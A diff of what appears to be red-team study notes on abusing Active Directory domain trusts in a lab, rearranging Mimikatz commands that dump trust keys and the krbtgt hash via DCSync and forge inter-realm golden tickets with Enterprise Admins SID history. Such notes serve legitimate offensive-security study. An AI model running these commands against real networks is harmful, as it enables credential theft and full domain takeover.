@@ -948,20 +948,12 @@ Therefore within the domain from the perspective of ```laptop01.ecorp.bcorp.lab`
 
 If we get the trust key we can forge an Inter-realm TGT and traverse domains. There are multiple ways to achieve this once in possession of DA prvileges:
 
-On the DC:
+Dump the Trust Key:
 ```Invoke-Mimikatz -Command '"lsadump::trust /patch"'```
 
+Dump the krbtgt:
+```Invoke-Mimikatz -Command '"lsadump::dcsync /domain:ecorp.bcorp.lab /user:ecorp\krbtgt"'```
 
-OR via DCSync:
-```Invoke-Mimikatz -Command '"lsadump::dcsync /user:ecorp\bcorp$"'```
-
-
-"_by querying the FOREIGN_DOMAIN_SHORTNAME$ account_": 
-
--https://harmj0y.medium.com/a-guide-to-attacking-domain-trusts-ef5f8992bb9d
-
-
-```Invoke-Mimikatz -Command '"lsadump::dcsync /domain:external.local /user:SUB$"'```
 
 We are looking for the **IN** Trust key (from external to current domain), and can then inject this into memory using ```/rc4:``` OR ```/krbtgt:```
 
@@ -977,6 +969,16 @@ krbtgt -
 ```
 Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:child.parent.lab /sid:S-1-5-21-<currentdomainSID> /sids:S-1-5-21-<parentdomainSID>-519 /krbtgt:f052addf1d43f864a7d0c21cbce440c9 /ticket:C:\Temp\krbtgt_tkt.kirbi"'
 ```
+* * * 
+
+You can also achieve this "_by querying the FOREIGN_DOMAIN_SHORTNAME$ account_": 
+
+-https://harmj0y.medium.com/a-guide-to-attacking-domain-trusts-ef5f8992bb9d
+
+
+```Invoke-Mimikatz -Command '"lsadump::dcsync /domain:external.local /user:SUB$"'```
+* * * 
+
 #### Across Forests - Inter-Forest Trust
 There is SID filtering across forests so abusing SID history to force ```/-519``` for Enterprise Admins will not work when abusing external forest trusts. Other than that it is the same:
 
